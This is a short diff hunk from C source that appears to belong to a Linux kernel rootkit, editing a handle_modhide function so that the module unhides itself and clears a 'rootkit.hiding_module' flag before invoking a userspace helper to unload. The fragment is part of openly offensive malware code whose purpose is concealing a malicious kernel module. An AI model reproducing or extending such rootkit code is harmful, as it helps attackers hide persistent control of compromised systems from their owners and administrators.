@@ -85,9 +85,10 @@ handle_modhide(unsigned long arg)
 
         DEBUG_NOTICE("unloading module\n");
 
-        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+        unhide_module();
+        rootkit.hiding_module = 0;
 
-        DEBUG_NOTICE("after unload\n");
+        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     } else if (sarg < 0) {
         unhide_module();
         rootkit.hiding_module = 0;
